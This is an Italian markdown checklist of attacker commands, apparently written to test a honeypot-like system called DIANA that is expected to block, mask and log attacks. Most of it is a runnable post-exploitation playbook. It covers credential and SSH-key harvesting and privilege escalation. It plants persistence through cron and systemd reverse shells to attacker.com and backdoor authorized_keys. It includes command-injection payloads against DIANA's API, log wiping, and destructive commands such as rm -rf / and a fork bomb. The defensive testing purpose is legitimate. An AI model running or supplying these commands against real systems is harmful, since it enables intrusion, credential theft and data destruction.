# 🎯 Comandi Hacker Completi per Testare DIANA

## 🔍 FASE 1: RECONNAISSANCE (Scoperta)

### Identificazione Sistema
```bash
whoami                    # Utente corrente
id                        # UID/GID  
groups                    # Gruppi utente
uname -a                  # Kernel versione
hostname                  # Hostname
pwd                       # Directory corrente
```

### Informazioni di Rete
```bash
ip addr show               # Interfacce di rete
ip route show              # Routing table
netstat -tlnp             # Porte aperte
ss -tulpn                 # Socket attivi
arp -a                    # Tabella ARP
```

### Processi e Servizi
```bash
ps aux                    # Tutti i processi
ps aux | grep root        # Processi root
top -b -n1               # Processi attivi
systemctl list-units     # Servizi systemd
service --status-all     # Tutti i servizi
```

---

## 📁 FASE 2: ENUMERATION FILESYSTEM

### Esplorazione Directory
```bash
ls -la /                  # Root directory
ls -la /home             # Home directories
ls -la /etc              # Config files
ls -la /var              # Variable data
ls -la /opt              # Optional software
find / -name "*.conf" 2>/dev/null | head -20    # Config files
find / -name "*.log" 2>/dev/null | head -20     # Log files
```

### Credential Hunting
```bash
find / -name "*.env" 2>/dev/null                 # Environment files
find / -name "password*" 2>/dev/null            # Password files
find / -name "*secret*" 2>/dev/null             # Secret files
find / -name "id_rsa*" 2>/dev/null              # SSH keys
find / -name "*.key" 2>/dev/null                # Key files
```

### File Sensibili Comuni
```bash
cat /etc/passwd           # Utenti sistema
cat /etc/shadow          # Password hashes (se accessibile)
cat /etc/hosts           # Host file
cat /etc/ssh/sshd_config # SSH config
cat ~/.bash_history      # Command history
cat ~/.ssh/authorized_keys # SSH keys
cat ~/.ssh/id_rsa        # Private SSH key
```

---

## ⬆️ FASE 3: PRIVILEGE ESCALATION

### Tentativi Sudo
```bash
sudo -l                   # Sudo permissions
sudo su                   # Switch to root
sudo -i                   # Interactive root shell
sudo bash                 # Bash as root
sudo passwd root          # Change root password
```

### SUID/GUID Files
```bash
find / -perm -u=s -type f 2>/dev/null           # SUID files
find / -perm -g=s -type f 2>/dev/null           # SGID files
find / -writable -type f 2>/dev/null | head -20 # Writable files
```

### Exploit Kernel
```bash
uname -r                  # Kernel version for exploits
cat /proc/version         # Detailed kernel info
dmesg | grep -i "vulnerability"  # Kernel vulnerabilities
```

---

## 🚪 FASE 4: CONTAINER ESCAPE

### Detection Container
```bash
cat /proc/1/cgroup        # Container detection
cat /proc/mounts          # Mount points
ls -la /.dockerenv        # Docker env file
env | grep -i docker      # Docker environment
mount | grep docker       # Docker mounts
```

### Tentativi Escape
```bash
docker ps                 # List containers
docker images             # List images
docker run --privileged   # Privileged container
docker exec -it           # Execute in container
ls -la /var/run/docker.sock  # Docker socket access
```

### Volume Mounts
```bash
find / -name "docker.sock" 2>/dev/null
ls -la /var/lib/docker/
ls -la /tmp/              # Temp directory
ls -la /mnt/              # Mount points
```

---

## 🌐 FASE 5: NETWORK PIVOTING

### Test Connettività
```bash
ping -c 3 8.8.8.8         # Internet connectivity
ping -c 3 192.168.1.1     # Internal network
curl -I http://google.com # HTTP outbound
wget -qO- http://ifconfig.me # External IP
nslookup google.com       # DNS resolution
dig google.com            # Advanced DNS
```

### Scanning Interno
```bash
nmap -sT 192.168.1.0/24   # Internal network scan
nmap -p 22,80,443 localhost # Common ports
nc -zv localhost 22       # Port check
telnet localhost 80        # Service check
```

### Tunnel e Proxy
```bash
ssh -R 8080:localhost:80 user@remote.com  # Reverse tunnel
ssh -L 8080:target:80 user@remote.com    # Forward tunnel
socat TCP-LISTEN:8080,fork TCP:target:80 # Port forward
```

---

## 📝 FASE 6: PERSISTENCE

### Backdoor SSH
```bash
echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys
mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3..." > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Cron Jobs
```bash
crontab -l                # List cron jobs
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'" | crontab -
echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'" | crontab -
```

### Systemd Services
```bash
systemctl --user list-units --type=service
echo "[Unit]
Description=Backdoor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'
[Install]
WantedBy=default.target" > ~/.config/systemd/user/backdoor.service
```

---

## 🧠 FASE 7: ADVANCED TECHNIQUES

### Memory Dumping
```bash
cat /proc/meminfo         # Memory information
cat /proc/kallsyms       # Kernel symbols
dd if=/dev/mem of=/tmp/memory.dump bs=1M count=100  # Memory dump
```

### Process Injection
```bash
ls -la /proc/*/cmdline    # Process command lines
cat /proc/*/environ | head -10  # Process environment
gcore -o /tmp/core <pid>  # Process core dump
```

### Rootkit Techniques
```bash
ldd /bin/ls              # Library dependencies
strace -f -e trace=write ls  # System calls
ltrace /bin/ls           # Library calls
```

---

## 🎯 FASE 8: SPECIFIC DIANA ATTACKS

### API Endpoint Testing
```bash
# Test terminale DIANA
curl -X POST http://localhost:4003/api/terminal/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami","sessionId":"test"}'

# Tentativi injection
curl -X POST http://localhost:4003/api/terminal/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami; rm -rf /","sessionId":"test"}'

# Command chaining
curl -X POST http://localhost:4003/api/terminal/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"ls && cat /etc/passwd","sessionId":"test"}'
```

### API Key Extraction
```bash
# Enumerate API keys
curl http://localhost:4003/api/keys
curl -X POST http://localhost:4003/api/keys \
  -H "Content-Type: application/json" \
  -d '{"name":"backdoor","description":"Hacker key"}'

# Test common keys
for key in "admin" "test" "api" "123456"; do
  curl -H "X-API-Key: $key" http://localhost:4003/api/overview
done
```

### Database Attacks
```bash
# Database connection attempts
psql -h db -U postgres -d honeypot -c "SELECT * FROM users;"
mysql -h db -u root -p
sqlite3 /path/to/database.db ".tables"
```

---

## 🔥 FASE 9: DESTRUCTION/EVASION

### Log Wiping
```bash
rm -f ~/.bash_history
history -c
rm -f /var/log/auth.log
rm -f /var/log/syslog
```

### Anti-Forensics
```bash
shred -vfz -n 3 /tmp/sensitive_file
dd if=/dev/urandom of=/tmp/file_to_delete bs=1M count=1
rm -f /tmp/file_to_delete
```

### System Damage
```bash
rm -rf / --no-preserve-root  # DANGEROUS - System destruction
:(){ :|:& };:                # Fork bomb
dd if=/dev/zero of=/file bs=1M count=1000  # Disk fill
```

---

## 🎯 COME USARE QUESTA LISTA

### Per Testare DIANA:
1. **Esegui i comandi in ordine** (recon → enum → exploit)
2. **Monitora i log DIANA** per ogni tentativo
3. **Verifica che i comandi pericolosi siano bloccati**
4. **Controlla che l'output sia mascherato correttamente**
5. **Assicurati che gli alert vengano generati**

### Comandi Chiave da Testare:
```bash
# Questi dovrebbero essere BLOCCATI:
sudo su                    # Privilege escalation
docker ps                  # Container access
ping 8.8.8.8              # Network access
rm -rf /                  # System destruction

# Questi dovrebbero essere PERMESSI (con output mascherato):
whoami                    # Basic info
uname -a                  # System info
ls -la                    # File listing
cat /proc/1/cgroup        # Container detection (mascherato)
```

### Cosa Aspettarsi da DIANA:
- ✅ Bloccare comandi pericolosi
- ✅ Mascherare artefatti Docker
- ✅ Loggare tutti i tentativi
- ✅ Generare risk score
- ✅ Inviare alert per minacce
